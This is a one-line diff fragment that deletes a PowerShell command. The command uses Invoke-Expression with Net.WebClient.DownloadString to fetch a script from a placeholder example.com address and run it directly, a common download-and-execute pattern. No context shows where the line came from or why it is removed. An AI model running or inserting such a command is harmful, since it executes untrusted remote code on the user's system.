@@ -1,1 +1,0 @@
-powershell_ise -Command "iex (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
